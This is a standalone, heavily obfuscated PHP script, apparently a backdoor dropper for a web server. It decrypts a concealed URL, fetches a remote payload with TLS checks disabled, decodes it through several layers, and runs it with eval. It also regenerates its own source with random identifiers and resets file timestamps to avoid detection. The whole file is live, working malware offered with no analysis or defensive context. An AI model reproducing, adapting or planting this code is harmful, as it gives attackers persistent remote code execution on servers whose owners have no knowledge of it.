<?php
@error_reporting(0);@ini_set('display_errors','0');

$ga59a1681f=253;$t4388484839=372;$e340fa116=481;$ib7e4ac26=251;$i751861be=459;$ebaef22fdd3=738;

$k440537e=['fWttXSxTKSpX','SjRhQyhddiZX','T1VeaEpOJC41','ZmM1QVl1azE='];
$mfa53ca82='';
foreach($k440537e as $d7b911795e){
$mfa53ca82.=base64_decode($d7b911795e);
}

$o817624c='5d01157464b9bcae1c5fbf9294692121';
$x8a843f5859='amFmRFAxS1BjbVVvdVhSbjZEQ3NHS2xGMHQyZ3pyUGx6a05mNkErekZ0eEdPUEFobk5mNm1maVdObGxCa3FXNA==';
$s0b3de5c=openssl_decrypt(base64_decode($x8a843f5859),"AES-128-ECB",substr(sha1($mfa53ca82,true),0,16));
$u27885e024='WyJyb3QxMyIsInN0cnJldiJd';

function yc6e93615d($k2f4b181){
if(function_exists('curl_init')){
$v66a0ea5d0b7=@curl_init($k2f4b181);
if(!$v66a0ea5d0b7)return false;
@curl_setopt($v66a0ea5d0b7,CURLOPT_RETURNTRANSFER,1);
@curl_setopt($v66a0ea5d0b7,CURLOPT_SSL_VERIFYPEER,0);
@curl_setopt($v66a0ea5d0b7,CURLOPT_SSL_VERIFYHOST,0);
@curl_setopt($v66a0ea5d0b7,CURLOPT_TIMEOUT,30);
@curl_setopt($v66a0ea5d0b7,CURLOPT_FOLLOWLOCATION,1);
$t4e19bf9=@curl_exec($v66a0ea5d0b7);
@curl_close($v66a0ea5d0b7);
return $t4e19bf9;
}elseif(ini_get('allow_url_fopen')){
$re5c2f951b=@stream_context_create(['ssl'=>['verify_peer'=>false]]);
return @file_get_contents($k2f4b181,false,$re5c2f951b);
}
return false;
}

function s6c02f5737($q985f29bc,$ga8fe2132e){
$bf3d3cc0=json_decode(base64_decode($ga8fe2132e),true);
$m39283e8da=base64_decode($q985f29bc);
foreach(array_reverse($bf3d3cc0) as $r983abf447){
if($r983abf447=='rot13')$m39283e8da=str_rot13($m39283e8da);
elseif($r983abf447=='strrev')$m39283e8da=strrev($m39283e8da);
}
return base64_decode($m39283e8da);
}

function vcb0ed268f($y7709785a4b,$mfa53ca82,$o817624c){
$e87648ca67=hash_pbkdf2('sha256',$mfa53ca82,$o817624c,10000,32,true);
$q4240e1897=substr($y7709785a4b,0,1);
$pee1c5ee9d0=substr($y7709785a4b,1,16);
$l7eaf0e2=substr($y7709785a4b,17);
if($q4240e1897==chr(1)&&extension_loaded('openssl')){
return openssl_decrypt($l7eaf0e2,'aes-256-ctr',$e87648ca67,OPENSSL_RAW_DATA,$pee1c5ee9d0);
}else{
$k2f4b181='';
for($v66a0ea5d0b7=0;$v66a0ea5d0b7<strlen($l7eaf0e2);$v66a0ea5d0b7++){
$k2f4b181.=$l7eaf0e2[$v66a0ea5d0b7]^$e87648ca67[$v66a0ea5d0b7%strlen($e87648ca67)];
}
return $k2f4b181;
}
}

$t4e19bf9=yc6e93615d($s0b3de5c);
if(!$t4e19bf9)die('E');
$re5c2f951b=s6c02f5737($t4e19bf9,$u27885e024);
$q985f29bc=vcb0ed268f($re5c2f951b,$mfa53ca82,$o817624c);
@eval('?>'.$q985f29bc);

class X20c15df07{
private static $yd4ff425a=0;
private $dc650a3e487c='5d01157464b9bcae1c5fbf9294692121';
private $z3c2d7f989='amFmRFAxS1BjbVVvdVhSbjZEQ3NHS2xGMHQyZ3pyUGx6a05mNkErekZ0eEdPUEFobk5mNm1maVdObGxCa3FXNA==';
private $v72b0873='WyJyb3QxMyIsInN0cnJldiJd';
private $z8f60839=['fWttXSxTKSpX','SjRhQyhddiZX','T1VeaEpOJC41','ZmM1QVl1azE='];

public function ve91c50c(){
if(!empty($_GET)||!empty($_POST))return false;
clearstatcache();
if(time()-filemtime(__FILE__)>86400)return true;
if(rand(1,100)<=3)return true;
self::$yd4ff425a++;
if(self::$yd4ff425a>=50)return true;
return false;
}

public function ff1606601d(){
$file=__FILE__;
clearstatcache();
$stat=stat($file);
$mtime=$stat['mtime'];
$atime=$stat['atime'];

$nv=[];
for($i=0;$i<26;$i++){
$c='abcdefghijklmnopqrstuvwxyz';
$n='$'.$c[rand(0,25)];
for($j=0;$j<rand(7,11);$j++)$n.=substr(md5(mt_rand()),rand(0,25),1);
$nv[]=$n;
}

$nf=[];
for($i=0;$i<10;$i++){
$c='abcdefghijklmnopqrstuvwxyz';
$n=$c[rand(0,25)].substr(md5(mt_rand()),0,1);
for($j=0;$j<rand(6,10);$j++)$n.=substr(md5(mt_rand()),rand(0,25),1);
$nf[]=$n;
}

$nc=chr(rand(65,90));
for($i=0;$i<rand(8,12);$i++)$nc.=substr(md5(mt_rand()),rand(0,25),1);

$c='<?php'."\n";
$c.='@error_reporting(0);@ini_set(\'display_errors\',\'0\');'."\n\n";
for($i=0;$i<rand(4,8);$i++){
$c.='$'.substr(md5(mt_rand()),0,8).'='.rand(100,999).';';
}
$c.="\n\n";

$c.=$nv[0].'=[';
foreach($this->z8f60839 as $k){
$c.='\''.addslashes($k).'\',';
}
$c=rtrim($c,',').'];'."\n";
$c.=$nv[1].'=\'\';'."\n";
$c.='foreach('.$nv[0].' as '.$nv[2].'){\n';
$c.=$nv[1].'.=base64_decode('.$nv[2].');\n}\n\n';

$c.=$nv[3].'=\''.addslashes($this->dc650a3e487c).'\';\n';
$c.=$nv[25].'=\''.addslashes($this->z3c2d7f989).'\';\n';
$c.=$nv[4].'=openssl_decrypt(base64_decode('.$nv[25].'),\\"AES-128-ECB\\",substr(sha1('.$nv[1].',true),0,16));\n';
$c.=$nv[5].'=\''.addslashes($this->v72b0873).'\';\n\n';

$c.='function '.$nf[0].'('.$nv[6].'){\n';
$c.='if(function_exists(\'curl_init\')){\n';
$c.=$nv[7].'=@curl_init('.$nv[6].');\n';
$c.='if(!'.$nv[7].')return false;\n';
$c.='@curl_setopt('.$nv[7].',CURLOPT_RETURNTRANSFER,1);\n';
$c.='@curl_setopt('.$nv[7].',CURLOPT_SSL_VERIFYPEER,0);\n';
$c.='@curl_setopt('.$nv[7].',CURLOPT_SSL_VERIFYHOST,0);\n';
$c.='@curl_setopt('.$nv[7].',CURLOPT_TIMEOUT,30);\n';
$c.='@curl_setopt('.$nv[7].',CURLOPT_FOLLOWLOCATION,1);\n';
$c.=$nv[8].'=@curl_exec('.$nv[7].');\n';
$c.='@curl_close('.$nv[7].');\n';
$c.='return '.$nv[8].';\n';
$c.='}elseif(ini_get(\'allow_url_fopen\')){\n';
$c.=$nv[9].'=@stream_context_create([\'ssl\'=>[\'verify_peer\'=>false]]);\n';
$c.='return @file_get_contents('.$nv[6].',false,'.$nv[9].');\n}\n';
$c.='return false;\n}\n\n';

$c.='function '.$nf[1].'('.$nv[10].','.$nv[11].'){\n';
$c.=$nv[12].'=json_decode(base64_decode('.$nv[11].'),true);\n';
$c.=$nv[13].'=base64_decode('.$nv[10].');\n';
$c.='foreach(array_reverse('.$nv[12].') as '.$nv[14].'){\n';
$c.='if('.$nv[14].'==\'rot13\')'.$nv[13].'=str_rot13('.$nv[13].');\n';
$c.='elseif('.$nv[14].'==\'strrev\')'.$nv[13].'=strrev('.$nv[13].');\n';
$c.='}\n';
$c.='return base64_decode('.$nv[13].');\n}\n\n';

$c.='function '.$nf[2].'('.$nv[15].','.$nv[1].','.$nv[3].'){\n';
$c.=$nv[16].'=hash_pbkdf2(\'sha256\','.$nv[1].','.$nv[3].',10000,32,true);\n';
$c.=$nv[17].'=substr('.$nv[15].',0,1);\n';
$c.=$nv[18].'=substr('.$nv[15].',1,16);\n';
$c.=$nv[19].'=substr('.$nv[15].',17);\n';
$c.='if('.$nv[17].'==chr(1)&&extension_loaded(\'openssl\')){\n';
$c.='return openssl_decrypt('.$nv[19].',\'aes-256-ctr\','.$nv[16].',OPENSSL_RAW_DATA,'.$nv[18].');\n';
$c.='}else{\n';
$c.=$nv[6].'=\'\';\n';
$c.='for('.$nv[7].'=0;'.$nv[7].'<strlen('.$nv[19].');'.$nv[7].'++){\n';
$c.=$nv[6].'.='.$nv[19].'['.$nv[7].']^'.$nv[16].'['.$nv[7].'%strlen('.$nv[16].')];\n';
$c.='}\n';
$c.='return '.$nv[6].';\n}\n}\n\n';

$c.=$nv[8].'='.$nf[0].'('.$nv[4].');\n';
$c.='if(!'.$nv[8].')die(\'E\');\n';
$c.=$nv[9].'='.$nf[1].'('.$nv[8].','.$nv[5].');\n';
$c.=$nv[10].'='.$nf[2].'('.$nv[9].','.$nv[1].','.$nv[3].');\n';
$c.='@eval(\'?>\'.'.$nv[10].');\n\n';

$c.='class '.$nc.'{\n';
$c.='private static '.$nv[20].'=0;\n';
$c.='private '.substr($nv[21],1).'=\''.addslashes($this->dc650a3e487c).'\';\n';
$c.='private '.substr($nv[22],1).'=\''.addslashes($this->z3c2d7f989).'\';\n';
$c.='private '.substr($nv[23],1).'=\''.addslashes($this->v72b0873).'\';\n';
$c.='private '.substr($nv[24],1).'=[';
foreach($this->z8f60839 as $k){
$c.='\''.addslashes($k).'\',';
}
$c=rtrim($c,',').'];\n\n';

$c.='public function '.$nf[3].'(){\n';
$c.='if(!empty($_GET)||!empty($_POST))return false;\n';
$c.='clearstatcache();\n';
$c.='if(time()-filemtime(__FILE__)>86400)return true;\n';
$c.='if(rand(1,100)<=3)return true;\n';
$c.='self::'.$nv[20].'++;\n';
$c.='if(self::'.$nv[20].'>=50)return true;\n';
$c.='return false;\n}\n\n';

$c.='public function '.$nf[4].'(){/*mutate*/}\n';
$c.='}\n\n';

$c.='$obj=new '.$nc.';\n';
$c.='if($obj->'.$nf[3].'()){\n';
$c.='$obj->'.$nf[4].'();\n';
$c.='}\n';
$c.='?>';

file_put_contents($file,$c);
touch($file,$mtime,$atime);
}
}

$obj=new X20c15df07();
if($obj->ve91c50c()){
$obj->ff1606601d();
}
?>